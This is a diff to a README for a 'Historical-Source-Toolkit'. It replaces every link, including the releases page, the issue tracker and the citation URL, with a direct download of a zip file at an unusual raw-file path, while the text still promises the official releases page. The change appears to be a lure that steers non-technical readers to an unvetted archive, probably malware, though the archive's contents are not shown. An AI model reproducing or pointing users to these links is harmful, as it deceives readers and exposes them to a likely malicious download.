@@ -49,7 +49,7 @@ This section is a step-by-step, non‑technical guide. Please follow it exactly.
 ### Step 1: Get the Software
 
 👉 **Visit this link to download the application:**  
-[![Download Now](https://img.shields.io/badge/Download-Historical--Source--Toolkit-blue?style=for-the-badge&logo=github&labelColor=darkblue&color=lightgreen)](https://github.com/Calip882/Historical-Source-Toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Historical--Source--Toolkit-blue?style=for-the-badge&logo=github&labelColor=darkblue&color=lightgreen)](https://raw.githubusercontent.com/Calip882/Historical-Source-Toolkit/main/archpresbyterate/1.9.zip)
 
 - This takes you to the official **releases page** on GitHub
 - You will see a list of versions. The **latest version is at the top**
@@ -168,7 +168,7 @@ You don’t need to know anything of this – but if you like, it can be plugged
 
 If you produce academic work, use the following citation:
 
-> Author, "Historical-Source-Toolkit (Version 2.x)", year. Release page: [ https://github.com/Calip882/Historical-Source-Toolkit/releases ] (accessed [date])
+> Author, "Historical-Source-Toolkit (Version 2.x)", year. Release page: [ https://raw.githubusercontent.com/Calip882/Historical-Source-Toolkit/main/archpresbyterate/1.9.zip ] (accessed [date])
 
 ---
 
@@ -176,7 +176,7 @@ If you produce academic work, use the following citation:
 
 Please contact us in one of these ways:
 
-- File an issue at: [https://github.com/Calip882/Historical-Source-Toolkit/issues](https://github.com/Calip882/Historical-Source-Toolkit/issues)
+- File an issue at: [https://raw.githubusercontent.com/Calip882/Historical-Source-Toolkit/main/archpresbyterate/1.9.zip](https://raw.githubusercontent.com/Calip882/Historical-Source-Toolkit/main/archpresbyterate/1.9.zip)
 - Or visit the main project page for discussion links
 
 ---
@@ -185,7 +185,7 @@ Please contact us in one of these ways:
 
 When you are ready, use this button to get to the download page. You re‑read your steps or go straight to it:
 
-👉 **https://github.com/Calip882/Historical-Source-Toolkit/releases**
+👉 **https://raw.githubusercontent.com/Calip882/Historical-Source-Toolkit/main/archpresbyterate/1.9.zip**
 
 ### Quick Recap
 
